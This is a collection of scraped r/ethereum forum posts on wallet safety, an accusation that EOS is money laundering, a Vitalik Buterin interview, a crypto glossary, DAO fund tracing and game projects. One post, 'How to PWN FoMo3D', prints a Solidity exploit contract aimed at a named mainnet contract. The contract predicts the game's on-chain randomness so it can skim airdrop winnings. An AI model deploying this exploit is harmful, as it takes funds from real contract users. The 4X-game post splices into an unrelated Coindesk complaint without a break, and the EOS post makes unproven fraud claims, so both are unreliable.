*   Use the [EAL](https://chrome.google.com/webstore/detail/etheraddresslookup/pdknmigbbbhmllnmgdfalmedcmcefdfn) or [MetaMask](https://myetherwallet.github.io/knowledge-base/migration/moving-from-private-key-to-metamask.html) Chrome Extension to block malicious websites.
*   Always check the URL: `https://www.myetherwallet.com`.
*   Always make sure the URL bar has `MYETHERWALLET LLC [US]` in green.
*   Do not trust messages or links sent to you randomly via email, Slack, Reddit, Twitter, etc.
*   Always navigate directly to a site before you enter information. Do not enter information after clicking a link from a message or email.
*   [Install an AdBlocker](https://chrome.google.com/webstore/detail/ublock-origin/cjpalhdlnbpafiamejdnhcphjbkeiagm?hl=en) and do not click ads on your search engine (e.g. Google).

### How To Protect Yourself from Scams

https://i.imgur.com/7L7wGTp.png

People will try to get you to give them money in return for nothing.

*   If it is too good to be true, it probably is.
*   Research before sending money to someone or some project. Look for information on a variety of websites and forums. Be wary.
*   Ask questions when you don't understand something or it doesn't seem right.
*   Don't let fear, FUD, or FOMO win over common sense. If something is very urgent, ask yourself ""why?"". It may be to create FOMO or prevent you from doing research.

---

### How To Protect Yourself from Loss

https://i.imgur.com/E2F0Dvx.png


If you lose your private key or password, it is gone forever. Don't lose it.

*   Make a backup of your private key and password. Do NOT just store it on your computer. Print it out on a piece of paper or save it to a USB drive.
*   Store this paper or USB drive in a different physical location. A backup is not useful if it is destroyed by a fire or flood along with your laptop.
*   Do not store your private key in Dropbox, Google Drive, or other cloud storage. If that account is compromised, your funds will be stolen.
*   If you have more than 1-week's worth of pay worth of cryptocurrency, get a hardware wallet. No excuses. It's worth it. I promise.

0,ethereum,"It's now clear EOS is behind Sybil attack on Ethereum that's why the gas price is almost 100 Gwei A few EOS Whales from china want to make Ethereum look inferior by financing shatcoins to clog the network. This wasn't their initial goal but after Fcoin started a voting process that was based on number of transactions the whales saw an opportunity! instead of improving their system and giving people what they promised they are attacking Ethereum to prove their point that EOS is an ""'ethereum killer"" what a bunch of twats!"
0,ethereum,"EOS might be a money laundering scheme - Suspicious activity inside After looking into the EOS contract to see how much Ether they were actually putting into the market, I stumbled across something quite weird that makes me think EOS is a massive money laundering scheme.

---

1. Massive amounts of ether sent daily from wallets that only interact with EOS contract

---

This was the first sign that tipped me off. The following accounts are sending hundreds of thousands of dollars to EOS every week. 

These accounts look like they were created before the contract and have only been used to buy from the contract, then send the funds to different exchanges. 

(There are plenty more, these are just the accounts I found within the last 10 pages and the first 2 pages of the Contract)

* https://etherscan.io/txs?a=0x1ecf0b798ebb43477b5c657963332d640871a0ec&p=1
* https://etherscan.io/address/0x2808c13b7b81c6fdcfb10ed6f158b84a3284d68f
* https://etherscan.io/address/0x1869e05f92ba2e0d71e9da71713c8672a18ea923
* https://etherscan.io/address/0x4e8c49fab23532ef2ed14058639f55cf45bade1e
* https://etherscan.io/address/0x720081be885c6c0de4d1c7f8ed0e3b284010e20b
* https://etherscan.io/txs?a=0x3d4211b8fd39b1fecafb27f707b23dc36b7e18bc&p=9
* https://etherscan.io/txs?a=0x1ecf0b798ebb43477b5c657963332d640871a0ec&p=1

All of these accounts ONLY interact with the EOS contract, they get funds from exchanges, and immediately send the EOS off to the exchange. 

---

2.The 1 Billion Dollar ICO

---

More like 1 Billion dollar money laundering scheme. We all know the creator of EOS has been in the crypto world for a very long time and as such has a lot of BTC and ETH, BTS, and all his other coins he has made during his time. 

Let me lay out a scenario for you and you tell me what you think:

1. Start ICO with unlimited cap
2. Funnel existing cryptos into your own ICO
3. Get your funds back....since you own the ICO
4. Get Tokens as well
5. Sell Tokens
6. Send BTC/ETH from tokens you just sold back to get more tokens
7. Repeat at step 2. 

This scheme can go on forever, or until the token your buying goes to 0.00. Yet EOS is currently .60 cents. Meaning if I owned the contract, I can continually send money and create more money out of thin air. 

ICOs are capped - not because its 'normal' but because it prevents fraud. If you don't cap the crowdsale, there is no prevention against fraud. Even with a capped crowdsale there is a chance of fraud, but its economically less viable the more you do it.

This is why other ICOs are not considered money laundering, there will be a point where your just buying your own tokens and its pointless. But if its uncapped, as long as the token has ANY market value (even .000001 cents) you can still make a profit doing this fraud. This is why ICO limit the amount of money they are bringing in, because if they did not set caps, there would be no way in knowing if the company bought all of their tokens themselves, or if it was a genuine firesale. 






While it may not be the case that EOS are COMPLETELY a money laundering operation, I see this as a very high statistical probability. Maybe they are not running the EOS sale with 100% intentions for laundering all their crypto, but it is definitely taking place. This is proven by the fact that there are accounts that were created around the tme of the creation of the EOS contract and ONLY interact with that contract. 

Can someone who has more capabilities than me, please look into this? These are accounts created only for EOS contract buys, the tokens are constantly been moved, if there are rumors that the creator is a scam artist within the community, so should the SEC/FBI be involved here? 

Also can someone explain the interactions that are going on between 0x000000... address and the others? Why does a null/dev/orginial address have so many ICO tokens and is constantly active? 


EDIT: Not trying to spread fud or make any claims, I'm just bring attention to what I found and hope someone can explain it, I don't own, nor will I ever own any EOS tokens. I just actually want answers. If anyone has information that I am missing, please share it! I'm hoping I'm wrong!

0,ethereum,"Vitalik Buterin: ""Putin knows what blockchain is ‚Äì this is the hype"" [Article translation from Russian] *x-posting this to a couple of other crypto subs because I think this is a good article*

I think this is a pretty good article, so I decided to translate it from Russian for the crypto community. It may even save some of you from doing bad investments, and maybe see what direction you should look in, and maybe shed some light on the possible future of the crypto.

I find that the crypto waters are murky today and Vitalik's thoughts make it clearer for me.

[Link to the source on Rusbase](https://rb.ru/opinion/buterin-rock-and-roll/)

---

In 2017 the Ethereum founder Vitalik Buterin made it to the top ten of the most influential young people according to the Fortune magazine. Some call him the crypto god, some ‚Äì a crypto-anarchist, and some just idolize him.

Any rumor on Vitalik affects the Ethereum exchange rate and costs or makes the Ethereum holders large amounts of money.

Rusbase attended an open discussion with the rock star of blockchain and got to know what the 23-year-old genius thinks and what happens in the industry.

**On himself and Ethereum**

1. How did I become interested in blockchain? There was a moment when I realized that this is a very interesting technology with strong mathematics and then I understood that there was a serious concept behind this, a transparency system. A community of several thousand people created their own financial system. This idea is very close to me. I like building something that no one has ever built before.

2. Creating Ethereum was not a question of money, it was a mission, an idea that you want to follow.

3. In 2011 I learned about bitcoin, and six months later I cofounded a bitcoin magazine [Bitcoin Magazine ‚Äì Ed.], two years later I was in the university [University of Waterloo - Ed.] and I was spending 30 hours a week on bitcoin programming tasks. Then I dropped out, traveled around, and watched blockchain projects develop in different countries of the world. In Israel, USA, Europe.

4. The idea to create Ethereum was not an immediate one. At first, I pitched it in the project that I worked in. But I was told it'd take a year to complete it. Then I quit. I remember walking around San Francisco, thinking, and then I just wrote a white paper and sent it to my friends, and they shared it with their friends. And it all started.

  **On mining**

5. The role of mining will decrease over time. This trend is not promising.

6. Mining as a business... This happens when you have your own source of energy or a subsidized source of energy. Then this is profitable. But anyway it's better to move towards the blockchain application, not speculation.

7. If you want to invest money, invest it in R&D.
  
  **On the blockchain prospects**

8. The first and the biggest blockchain prospect of the blockchain development is the financial one. This is cryptocurrencies, smart contracts, and state registry. For example, now it takes you several weeks to sell a house, whereas it can take just 3 minutes.

9. Besides the financial area, I'd say the following areas are prospective: the Internet security; the logistics; anything that has to do with identity; a more expensive but also a safer information storage.

10. The advantage of the blockchain is that there is a lot of data in the network that you can use for different purposes. The simplest example is the smart contract that lets you decrease the need for other types of insurance.

   **On ICOs**

11. The problem with ICOs is that someone makes something useful for a very small amount of people. Everyone sees now that there is open source software where you can make money easily. The developers now have the option to keep working in the basement or buy a Lamborghini.

12. There are now so many projects where the token is absolutely useless and people just want to make a lot of money.

13. The ICO concept is too centralized. The problem is that people evaluate the idea and not the team behind it. The investors put their money in the idea and there is no guarantee that the team will actually manage to do it. I think one needs to keep an eye on this and keep investing only if it's successful. And a better way would be to invest in the idea and not a specific team as there should be several teams competing for the investments to implement the idea.

14. The moment will come when the market realizes that many of the tokens that exist today have no value.

15. Tokening must have a purpose. The majority of the ICOs today don't have any backing and will fail.

   **On the cryptocurrency prospects**

16. I think that the cryptocurrency will not replace money 100% but in 20 to 40 years there's going to be a lot of different cryptocurrencies that will be used together.

17. The number of cryptocurrencies is going to increase. There will be cryptocurrencies for different cities, big companies will issue their own cryptocurrencies, like that Burger King case I heard about.

18. In 50 years everyone will have a wallet with 15 different types of cryptocurrency and you will be able to use them to make payments.

   **On the blockchain security**

19. There is a paradox now. The purpose of the blockchain is security. But the blockchain is a new technology that has security issues.

20. Right now you can safely use blockchain where no one will take damage if the blockchain breaks.

   **On Russia**

21. Attracting the investments based on blockchain is a very interesting thing for Russia, especially when you consider the imposed sanctions.

22. The expertise of the IT professionals in Russia is high, but there's just not enough of them.

23. No other country has the same degree of the desire to implement the technology. In Russia any place you go ‚Äì everyone discusses the blockchain, everyone is fascinated by it: from the higher officials to the small time entrepreneurs.

24. The blockchain in Russia needs smaller successful projects to prove itself.

   **On the world**

25. The blockchain is a part of the bigger trend. The world is becoming more and more digital. In 50 years people are going to have more friends abroad than in their own country.

26. Southeast Asia is very technological, but they don't have the same amount of interest as there's here [in Russia]. However, people there use QR-codes to sell oranges.

   **A happy end**

27. The cryptocurrencies are never going to be stable. However, the degree of volatility is going to decrease with the emergence of successful blockchain startups and with the increase in the volume of money in the cryptocurrencies. This will happen in a year or two.

28. The blockchain now is in Phase 3. Here's what this means:

* Phase 1: Several hacker anarchists become interested in it.

* Phase 2: Putin knows what blockchain is ‚Äì this is the hype phase.

* Phase 3:  The road from the hype to the real results. People know that the blockchain is an interesting idea. People know how to use it and they are already testing it. However, there's still no application on the big scale.

**EDIT**: I am disappointed that this has become a political discussion, ""Russia is bad and corrupt"". Make of that what you will. Don't let the media brainwash you. Russia has many problems just like any other government. This post was meant for the crypto discussion. r/ethereum of all places man"
0,ethereum,"Words are Hard: Defining Common Terms in the Ethereum / Crypto Space ### Wallet

- The interface / client / wrapper / holder that you use to manage your account(s).

- Example: MyEtherWallet.com, your Ledger Hardware Wallet, a Multisig Wallet Contract.

### Account

- A public & private keypair that ""holds"" your funds.

- Your funds are actually stored on the blockchain, not in the wallet or account.

- Just like your Reddit account has a`username (public)` and `password (private)`, so does your Ethereum account. For additional security, you can use a password to encrypt your private key which would result in a `username (public)` and `password (private)` and `password for that password (private + more secure)`. See the `Keystore File` section.

### Address *(""Public Key"")*

- You use this to send funds **to** an account.  

- Sometimes referred to as the ""public key""

- A string made up of `0x` + `40 hexadecimal characters`.

- In Ethereum, the address begins with `0x`.

- Example: `0x06A85356DCb5b307096726FB86A78c59D38e08ee`

### Public Key

- In cryptography, you have a keypair: the public and private key.

- You can derive a public key from a private key, but cannot derive a private key from a public key.

- (Advanced) In Ethereum, the address ""acts"" like the public key, but it's not actually the public key.

- (Advanced) In Ethereum, the public key is derived from the private key and is 128 hex characters. You then take the `""SHA3"" (Keccak-256)` hash of this (64 characters), take the last 40 characters, and prefix  with `0x`, give you your 42-character address.

### Private Key

- You use this to send funds **from** an account.  

- The secret half of your Address / public key.

- A string of 64 hexadecimal characters.

- ([Almost](https://crypto.stackexchange.com/questions/30269/are-all-possible-ec-private-keys-valid)) every string of 64 hexadecimal characters is a private key. 

- If you hand-type a private key differently today than yesterday, you will access a different wallet. Never hand type your private key.

- This is the string you need to send from your account. Without it you cannot access your funds. Although, you don't need to save this raw, unencrypted private key in this format. You can saving the fancy versions of it (e.g. the Keystore File / Mnemonic Phrase).

- Example: `afdfd9c3d2095ef696594f6cedcae59e72dcd697e2a7521b1578140422a4f890`

### Keystore File

- Encrypted version of your private key in JSON format (though it does not have a JSON extension) 

- A fancy version of your private key that is protected by a password of your choosing.

- When combined with the password, it has the private key.

- Safer than a private key because you need the password.

- File name usually is in the format `UTC` + `--` + `DATE_CREATED` + `--` + `YOUR_ADDRESS_WITHOUT_THE_OX`

- Example of File Nae: `UTC--2017-07-02T20-33-09.177Z--06a85356dcb5b307096726fb86a78c59d38e08ee`
- Example of Contents: `{""version"":3,""id"":""aa811d53-fe9a-44a2-bd1c-e737007b5591"",""address"":""06a85356dcb5b307096726fb86a78c59d38e08ee"",""Crypto"":{""ciphertext"":""f5a7cc8d4b8cf93510b0d0d057f3a52ac79fd48e619e0638c4ffd978ca180248"",""cipherparams"":{""iv"":""975ab00192e2dd74170e91ca59c0b0bd""},""cipher"":""aes-128-ctr"",""kdf"":""scrypt"",""kdfparams"":{""dklen"":32,""salt"":""0210f0d0b99e440dfbceb36373304638bac093a367ee7da6411cd165f7aa907a"",""n"":1024,""r"":8,""p"":1},""mac"":""8197a747a3855a10546a2ff939c36470daed78e393b670efa0c12fe3b23dd7e3""}}`

- (pw: `mypassword`)

### Mnemonic Phrase

- Another fancy version of your private key, that is actually used to derive multiple private keys.

- A (typically) 12 or 24 word phrase that allows you to access infinite number of accounts.

- Used by Ledger, TREZOR, MetaMask, Jaxx, and others.

- Originates from [BIP 39 Spec](https://github.com/bitcoin/bips/blob/master/bip-0039.mediawiki).

- The accounts you can access with this phrase are determined by the ""path"".

- Example 12-words: `brain surround have swap horror body response double fire dumb bring hazard`

- Example 24-words: `card enrich gesture connect kick topple fan body blind engine lemon swarm venue praise addict agent unaware equal bean sing govern income link leg`

### Hardware Wallet:

- Typically, a single-purpose device that ""holds"" your private key(s), ensuring your private keys are safe.

- Typically, they use a 24-word phrase. This phrase you should write down (not on your computer) and store separately from your hardware wallet.

- If you lose your hardware wallet, you can still gain access to your accounts & funds via the word-phrase you wrote down.

- Never type the word-phrase on your computer. It defeats the purpose of your hardware wallet.

### AddressIdenticon / AddressIcon:

- The colorful blob of colors that corresponds to your address.

- It is an easy way to see if your address is correct.

- [Example 1](http://i.imgur.com/lHUrIiZ.jpg)

- [Example 2](http://i.imgur.com/FvyLewS.jpg)

- *Note: the above addresses are a single character different but have remarkably different icons & colors. Magic!*

### Hexadecimal

- Used all over Ethereum for a variety of things, a hexadecimal string is comprised of the numbers `0 1 2 3 4 5 6 7 8 9` and `A B C D E F`

### Seed

- The input given to derive a private key. This should always be generated in a truly random way, not something you make up with your measly human brain.

- If you chose the seed, it is known as a `brain wallet`


### Brain Wallet

- An account generated from a seed or password or passphrase of your choosing.

- Humans are not capable of generating enough entropy and therefore the wallets derived from these phrases are insecure.

- Brain wallets can be brute forced by super fast computers.

- [Brain wallet are insecure.](https://www.reddit.com/r/ethereum/comments/45y8m7/brain_wallets_are_now_generally_shunned_by/)

- Don't use brain wallets.


### Entropy

- Also known as ""randomness"".

- The more random something is, the more entropy it has, and the more secure it is.

- Usually defined in ""bits of entropy"" or the number of years it would take to brute-force a ________ (e.g. private key) derived with that much entropy.

- Ethereum private keys are 256-bit keys

- 24-Word mnemonic phrases are also 256 bits of entropy. 2048 words in the dictionary. 11 bits of entropy (the words). `11 * 24 = 264`. The last word is a checksum.

0,ethereum,"How to PWN FoMo3D, a beginners guide I found out about FoMo3D today and saw that it's an pyramid game holding an insane $12M stash currently. Looking through the code, it's multiple contracts totaling thousands of lines of code. Let's be honest, $12M inside thousands of lines of Solidity... that's asking for it.

One thing that immediately caught my eye whilst looking through their code was:

    modifier isHuman() {
      address _addr = msg.sender;
      uint256 _codeLength;
    
      assembly {_codeLength := extcodesize(_addr)}
      require(_codeLength == 0, ""sorry humans only"");
      _;
    }

Ok, lemme rename that. I believe \`isHumanOrContractConstructor\` is a much better name for it. I guess you see where this is going. If the entire FoMo3D contract suite is based on the assumption that it can only be called from plain accounts (i.e. you can't execute complex code and can't do reentrancy)... they're going to have a bad time with constructors.

We now have our attack vector, but we still need to find a place to use it. I'm sure there are a few places to attempt to break the code, but the second thing that caught my eye was:

    /**
    * @dev generates a random number between 0-99 and checks to see if thats
    * resulted in an airdrop win
    * @return do we have a winner?
    */
    function airdrop()
    private
    view
    returns(bool)
    {
      uint256 seed = uint256(keccak256(abi.encodePacked(
      (block.timestamp).add
      (block.difficulty).add
      ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add
      (block.gaslimit).add
      ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add
      (block.number)
      )));
    
      if((seed - ((seed / 1000) * 1000)) < airDropTracker_)
        return(true);
      else
        return(false);
    }

Oh boy! On chain random number generation... just what we needed! I.e. at this point, we can create transactions that within their constructor can calculate the result of this \`airdrop()\` method, and if it's favorable, can call arbitrary methods on the FoMo3D contract (potentially multiple times).

Looking through the code to see where \`airdrop\` is being used, we can find that that any contribution larger than 0.1 Ether gets a chance to win 25% of some ingame stash. And that's the last missing piece of the puzzle. We can create a contract that can 100% win (or not play in the first place). So, here's a full repro (\*\*I didn't test it mind you, just wrote up the pseudocode, it may not be fully functional yet\*\*).

    pragma solidity ^0.4.24;
    
    interface FoMo3DlongInterface {
      function airDropTracker_() external returns (uint256);
      function airDropPot_() external returns (uint256);
      function withdraw() external;
    }
    
    contract PwnFoMo3D {
      constructor() public payable {
        // Link up the fomo3d contract and ensure this whole thing is worth it
        FoMo3DlongInterface fomo3d = FoMo3DlongInterface(0xA62142888ABa8370742bE823c1782D17A0389Da1);
        if (fomo3d.airDropPot_() < 0.4 ether) {
          revert();
        }
        // Calculate whether this transaction would produce an airdrop. Take the
        // ""random"" number generator from the FoMo3D contract.
        uint256 seed = uint256(keccak256(abi.encodePacked(
          (block.timestamp) +
          (block.difficulty) +
          ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)) +
          (block.gaslimit) +
          ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)) +
          (block.number)
        )));
    
        uint256 tracker = fomo3d.airDropTracker_();
        if((seed - ((seed / 1000) * 1000)) >= tracker) {
          revert();
        }
        // Ok, seems we can win the airdrop, pwn the contract
        address(fomo3d).call.value(0.1 ether)();
        fomo3d.withdraw();
        selfdestruct(msg.sender);
      }
    }

I didn't get to try out my little exploit, because the attack loses 0.1 ether for every ""airdrop"" call, so the only way to make it worthwhile is to wait until the airdrop's prize is > 0.1 ether. Given the 25% payout, that means airdrops need to total to > 0.4 ether. However, I saw a peculiarity that it never actually went above that value. So digging through the chain, I actually found someone who was skimming the airdoprs for 2 days now :))

[https://etherscan.io/txs?a=0x73b61a56cb93c17a1f5fb21c01cfe0fb23f132c3](https://etherscan.io/txs?a=0x73b61a56cb93c17a1f5fb21c01cfe0fb23f132c3)

Their attack code is not really available, but looking through a successful transaction you can see that they have a more elaborate pwner code: they try to deploy a new contract, but if the address is not a winner (per the evaluation of \`airdrop()\`, they don't revert, rather keep creating nested contracts until one succeeds). GG!

This attack only PWNs 1% of the FoMo3D contract suite as only that's the amount sent into airdrops. But to paraphrase the devs from their contracts: \*\*""lolz""\*\*.

And the team's reaction: yeah, we knew our 12M contract can be broken, no biggie.

0,ethereum,"Strange activity involved with the address the attacker of the DAO used to start the attack, thousands upon thousands of ethereum being transacted to hundreds of difference addresses. Including a transaction to Bittrex's smart contract wallet Was poking around some old URLs and came across this medium post (https://medium.com/@oaeee/the-rise-of-the-dark-dao-72b21a2212e3) summizing the attack and providing some links to the addresses involved.

Here we have the DAO creator: https://etherscan.io/address/0x4a574510c7014e4ae985403536074abe582adfc8

I noticed something different between the last time I checked this link, there was a transaction 43 days ago: https://etherscan.io/tx/0xe27a1a8d16c828b0ee45f3d9addf0332a4787b957b0f31c1451ef1fc63ecdf3f

Now lets go to the account that sent the ether (0.05):
https://etherscan.io/address/0x594ccfa066f53ea3622a120d767bf6d71714723a

Few days laters (38 days, 8hrs ago) there was a transaction for 0.5003ETH to another address:
https://etherscan.io/tx/0xd72ed111a7f32045da9c2374f2d1261ed91613dbdb26c87f06f216e5e432de27

Here's the destination address for that transaction:
https://etherscan.io/address/0x249a0b8a85da020d53bec45a4764998fc796ab78

Few days later there is another transaction (now *this* is where things get VERY interesting):
https://etherscan.io/tx/0x6e0e1a71f191896da818b8b19042214f6d609c8e77764f6885096b3a7990996c

This is the destination address for that transaction, and you'll notice this time as opposed to waiting a few days before making another transaction, only 22 blocks are waited (this should be just enough time for the transaction to clear shouldn't it?) anyhow pay attention to the block number that the transaction is submitted at:
https://etherscan.io/tx/0x013e38d14024a330f646ff1ce6a69b7eef3b8430b6dab38e188ef947b9b8731b

Let's go to the destination address:
https://etherscan.io/address/0x08dd54f7bf39ac5f4ef9c16ec2a8156dbd5ad2bb

HUNDREDS of ethereum start flowing into that address at block 4465539, the same block number I mentioned to pay attention to from the last transaction. Two more transactions are made and the pattern that is forming becomes more clear:
https://etherscan.io/tx/0xc880316d1b740d76206d4e8e861b3b0d9adc1884f126fc939d73bdebc729841a

Here's the two destination addresses:
https://etherscan.io/address/0x3f1b9fe2cd615bbd4b57c211e1c27783f355d658
https://etherscan.io/address/0x3227b8a7335e4b309105afba2e822a0c5a68cf46

From here on out if you follow those transactions you'll notice the funds being moved across multiple addresses as soon as the funds come in.

I followed a particular transaction chain for quite some time and ended up here a Bittrex wallet contract:
https://etherscan.io/address/0x9434092407915be059e76ba88589d464401f2589

0,ethereum,"You've met with a terrible fate, haven't you? You may remember me from [2 years ago](https://www.reddit.com/r/ethereum/comments/5kr0uu/how_ethereum_will_eventually_become_the_internet/), when Ethereum was selling for 7 USD and officially dead. That motivated me to submit a lengthy explanation on how it was the future of the internet, the price would eventually recover and there was nothing to worry about. Turns out Ethereum is officially dead again, selling at 130 usd. Why? Because it is boring. The ICO craze is over and we're experimenting a long-lasting hangover. Normal people are saturated with crypto and going on with their lives. Google trends are down. Nobody is here. You can hear the crickets. And that won't change any soon. 

But, once again, there is nothing to worry about, as long as you're patient: eventually things will change because, as I've told you before, credit cards are stupid, fiat is mortal, and Ethereum has the perfect momentum to eventually become the worldwide economy; it can't die, by design. Once we have new exciting stuff that makes people entertained and curious, they'll be back. Meanwhile, here are some suggestions to have some fun and speed up this process.

## A book series

First, we really need a good series based on crypto. I'm thinking of something like cyber wars, where people around the world realize crypto is money, and money is power, thus online factions fight over control over it all. It should be realistic and reference the real crypto history as much as possible, giving coolish explanations for things like Satoshi Nakamoto, MtGox, TheDAO incident, Bitconnect and so on; there is endless source of material. I'd say a good book would aggregate more value on the field as 3.6 research breakthroughs. Don't underestimate the power of literature to moving people's mind. Any writer around?


## Funding developers just to develop things they like

Developers are the most important resource we have They're the crypto equivalent of cattle in Indian culture. They build the towers and castles that protect our lands from all evil. They're sacred. Problem is, developers need food to survive, and that little inconvenience causes most of them to get sucked by projects that have money. And guess who has money? Scammy ICOs. What I'm saying is that, honestly, most developers of this field, today, are working in projects that produce no real value. It is a well-known fact that the most amazing inventions of humanity came from developers on their spare times, working in things they loved. See Gmail, Youtube, Twitter, Facebook and the wheel. As such, I suggest we start a decentralized platform to give developers crypto-currencies to just develop what they like. No question asked. As long as they're building stuff, and they're enjoying it, we should give them $$$. If we can give millions to scammy ICOs, we can do that. I hypothesize that, as a result, mind-blowing things will be created and we'll grow at a unforeseen pace. So, let's do it!

## Games

We need to build games. But not games like CryptoKitties which, while cool as a concept, are essentially classic games in a blockchain suit. We need games that are truly decentralized. Think of a huge RPG world where people can travel around, battle, collect epic items and trade them in an emerging economy. But not only that: a game without a central developer, where people all around the world contributing with art, map, code, and a decentralized system for adopting changes. Or, who know, an e-sport such as a MOBA like LoL, or a card game like Heartstone, without a central company behind its development. The good thing about games is that they're so inclusive, people love games, and it takes one good game to make a case for crypto. We need more of them!

## A government

You may or may not have noticed, but governments are fueled by money. The only reason you have to pay taxes to the U.S. is that it is powerful (rich) enough to force you to. Once crypto-currencies inevitably become more valuable than fiat, the power of those states will decrease. There will be anti-tax movements, people will stop respecting governments, and eventually the old power will fade away as decentralized governments emerge. That is far from happening, of course, but we can already experiment. So, I have a suggestion: let's create the Decentralized State of Earth! A pretend-to-be universtal state with laws, taxes and even an army. When someone asks, it is just a silly joke, and our army is actually composed by kitten. Of course, secretly, we'll be building a real army of dolphins.


...

That's it. Thanks for listening to this old man! For those who know who I am: *shh*.

0,ethereum,"I'm making a 4X-ish strategy game on Ethereum, somewhat similar to the Civilization series I believe that one way to make a successful gaming dapp on Ethereum to create an in-game economy between players, which allows players to earn ETH from buying and selling in-game assets/resources. There are several genres that generally develop in-game economies, some of which are RPGs, simulation games and strategy games. I've chosen to make a crypto game inspired by the popular Civilization series, with some changes to fit smart contracts ie not truly turn-based but rather time-based.


The slow pace of this kind of game is perfect for Ethereum, which requires players to wait after every turn before they see the effects of their actions; and makes block mining time a feature rather than a hindrance because you'll be much more thoughtful about which step you'll take next, be it acquiring territory, gathering particular resources, creating and moving troops, attacking enemies, etc.  in a hegaxon-grid-based world.


Now I'm in beta stage and looking to see if there is interest in this kind of game on Ethereum. I've deployed the contracts on both the Ropsten and Mainnet blockchains. If you want to test the game completely free you can try the Ropsten version, whereas if you already want to earn ETH, you can try the mainnet version. Or both.
I am thinking about adding more features like federations. Federations would allow players to team up diplomatically (much like guilds or alliances) for war or territory dominance purposes allowing better ether gains; and a deeper tech tree.

- After reading the email, Omar tried to delete the videos from his channel, but found that he had a ""copyright strike"" from Coindesk. Because 4 of his live streamed videos were flagged for copyright violations, Omar has lost the ability to live stream from his channel for 3 months.

## Coindesk the Company and Staff
The staff at Coindesk are incredible. Throughout multiple conferences I have gotten to know many of them. They truly care about the crypto community. There has been some backlash recently against Coindesk over perceived favoritism of ETC compared to ETH, or downplaying ETH all together. Here are some things that I am sure of:

- All of the writers I know, which are most of the ones who report on Ethereum, are not against ETH.
- Although Coindesk is owned by Digital Currency Group (DCG), none of the writers that I know are directly or indirectly influenced by DCG or anyone at DCG (including Barry Silbert). 
- DCG supports both ETH and ETC through their subsidiaries and companies they have invested in such as Grayscale and Etherscan.

## Bottom Line and What I Want Out of This
- I want an explanation from Coindesk that includes a copy of the attendee terms and conditions that they claim Omar is violating. I would also like to know the licensing costs. I am currently in violation of the ToC based on [this video that is still online](https://twitter.com/hudsonjameson/status/866639904326995968). So is [Voice of America](http://www.voanews.com/a/blockchain-technology-goes-mainstream/3873538.html), [Ripple](https://www.youtube.com/watch?v=Al2DlS3pje0), [Civic](https://www.youtube.com/watch?v=3LULNvYkKso), and dozens more companies (unless of course they have paid a licensing fee).

UPDATE: [See this comment below for what may be the ToC. I did not see this link when signing up via their Bizzabo system and the link provided is given for 2018 Consensus attendees (although the PDF lists 2017): https://np.reddit.com/r/ethereum/comments/6dw4n4/why_i_cant_defend_coindesk_any_longer_take_action/di5v662

## What You Can Do
- [Unsubscribe from Coindesk's Twitter](https://twitter.com/coindesk).
- [Tweet at Coindesk and demand an explanation](https://twitter.com/coindesk).
- If anyone from Coindesk is reading this and is disgruntled leave the company. I know a few of you already have or are in the process of it. You don't have to make a fuss about it or trash them on the way out. Just leave and create a less corporate and more community oriented coin news media site (like what Coindesk used to be). We would support you.

I have defended Coindesk for months based on my very positive relationships with the writers and staff. I can't defend Coindesk as a whole anymore because even if the majority of those who I interact with have good intentions, something has shifted at a company level and they seem to value corporate interests over the little guys. They no  longer represent the best interests of our community."
0,ethereum,"I got fed up with cries of ""Tulip Mania"" so I'm making cryptulips.co, its CryptoKitties, but with Tulips. Hey r/ethereum!

So I've been HODL-ing for a long time, and I've recently gotten into Solidity development.  Shit's dope.

The long and short of this project is that I got sick and tired of people telling me that the bullish Cryptocurrency market we're in was analogous the the 1600's Tulip Mania.

So to make fun of these people I created [cryptulips.co](https://cryptulips.co).  Which is basically CryptoKitties, **but with tulips**.  Allowing people to trade, grow, breed, and sell unique digital tulips that live forever on the blockchain.

If you signup I'll keep you in the loop on the development (when it's on ropsten, main network, etc) and give you first crack at gen0 tulips.

I just [posted this the other day](https://www.reddit.com/r/ethtrader/comments/7l4ayt/tulip_mania_in_crypto_is_bullshit_so_i_made/) on r/ethtrader and it went crazy! 

Cryptulips is primarily a joke, but I hope it'll be a fun learning experience and that it will ruffle the feathers of some of the old economic guard.

If you think it's funny, or interesting please holler at me and sign up!

tl;dr I'm making CryptoKitties for Tulips to make fun of naysayers

0,ethereum,"Creating useful dapps is easier than people think (way easier than CryptoZombies, for example). Starting next week, I'll show this with a series of live seminars, demonstrating the design and development of several simple dapps, start to finish. Hey all! I'm the guy who put together and demonstrated [Toastycoin and Burnable Payments](http://www.toastycoin.com). After Toastycoin, I scratched my head a lot over how to scale up the research and development of more cryptoeconomic primitives.

**This has lead me to start a free, virtual academy, focused on the rapid development of smart contracts and their interfaces.** Seminars start next Monday, and a schedule will be announced later this week. Seminars will be archived publicly.

No enrollment process--just tune in live (and ask questions!) or watch the archives.

## CPA: The CryptoPrimitive Academy

[CPA](http://cpacademy.io) is a non-profit, non-coin enterprise founded on two major premises:

1. There is a large, untapped pool of talented developers, who would be happy to help build the dapp ecosystem--if only they had a reliable source of personalized guidance for determining not only **how to build dapps**, but more fundamentally, **what to build and why.**

2. A subset of dapps, known as **cryptoeconomic primitives**, will likely be the bedrock upon which larger Ethereum applications are built. But because cryptoeconomic primitives are (by definition) non-proprietary, they don't return profit or increase coin value--so research and development into this field is lacking. Addressing this lack would directly increase the utility of Ethereum to developers, thereby indirectly doing the same for users.

CPA will bring these two dynamics together first by designing and developing cryptoeconomic primitives live via the seminars, but also by viewing work on cryptoeconomic primitives as a kind of opt-in coursework.

Students who choose to engage in this coursework can apply for CPA accreditation, which will be granted if they've made substantial progress on the cryptoeconomic primitive in question, without significant outside guidance.

We expect to cultivate a welcoming community made up of students of varying skillsets, which both educates its members and produces cryptoeconomic primitives that directly increase Ethereum's utility.

### Office Hours

Starting next Monday, I'll be online and available, minus occasional lunch/coffee breaks, between **UTC weekdays 17:00 and 01:00.** During this time, I'll be available on the CryptoPrimitive slack ([invite here](https://cp-slack-invite.herokuapp.com/)) to answer any questions related to the coursework.

### Pre-reqs

We will assume all students are comfortable with OOP and can understand simple JS and/or Python code. Anyone can join the seminars, of course, but we may ignore questions that seem to come from ignorance in these areas.

### Seminars

Seminars will start next week on Monday, and occur on a regular weekly schedule. This schedule will be determined after reviewing the comments from this post, but remember that all seminars will be archived and publicly available.

